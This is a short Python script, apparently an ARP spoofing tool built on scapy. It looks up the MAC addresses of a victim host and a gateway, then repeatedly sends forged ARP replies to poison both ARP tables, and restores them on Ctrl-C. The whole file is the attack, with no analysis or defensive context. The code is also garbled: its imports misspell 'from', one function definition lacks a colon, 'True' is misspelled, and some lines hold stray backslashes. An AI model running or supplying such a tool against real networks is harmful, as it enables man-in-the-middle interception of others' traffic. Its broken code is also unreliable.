form scapy.all import *
form time import sleep

def getMAC(ip)
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans :
        return r.sprintf('%Ether.src%')

def poisonARP(srcip, targettip, targetmac) :
    arp = ARP(op=2, psrc=srcip, pdst=targettip, hwdst=targetmac)
    send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac) :
    arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip, \ hwdst= 'ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
    arp2 = ARP(op=2, pdst=gatewayip, psrc=victimip, \ hwdst= 'ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
    send(arp1, count=3)
    send(arp2, count=3)

def main() :
    gatewayip = ''
    victimip = ''

    victimmac = getMAC(victimip)
    gatewaymac = getMAC(gatewayip)

    if victimmac == None or gatewaymac == None:
        print('Could not find MAC Address')
        return

    print('+++ARP Spoofing START -> VICTIM IP [%s]' %victimip)
    print (' [%s] : POISON ARP Table [%s] -> [%s]' %(victimip,\gatewaymac, victimmac))
    try:
        while Ture:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt : # Ctrl -C key input
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('---ARP Spoofing END -> RESTORED ARP Table')

if __name__ == '__main__' :
    main()
